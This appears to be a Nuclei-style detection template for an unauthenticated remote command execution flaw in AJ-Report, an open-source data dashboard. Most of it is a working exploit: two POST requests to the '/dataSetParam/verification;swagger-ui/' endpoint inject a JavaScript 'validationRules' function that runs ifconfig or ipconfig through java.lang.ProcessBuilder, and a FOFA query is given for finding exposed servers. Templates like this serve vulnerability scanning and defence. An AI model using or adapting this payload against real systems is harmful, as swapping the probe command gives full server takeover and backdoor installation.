http:
    - matchers:
        - part: body
          type: word
          words:
            - 'eth0:'
            - Windows IP
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json;charset=UTF-8

          {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ifconfig\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
        - |
          POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json;charset=UTF-8

          {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ipconfig\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
id: AJ-Report-verification_swagger-ui-RCE
info:
    author: Superhero
    description: |-
        fofa: title="AJ-Report"
        AJ-Report开源数据大屏 verification;swagger-ui接口存在远程命令执行漏洞，未经身份验证的远程攻击者可以利用此类漏洞执行任意命令，写入后门文件，最终可获取服务器权限。
    name: AJ-Report开源数据大屏 verification；swagger-ui RCE漏洞
    reference:
        - https://superhero.blog.csdn.net/article/details/139902252
    severity: high
    tags:
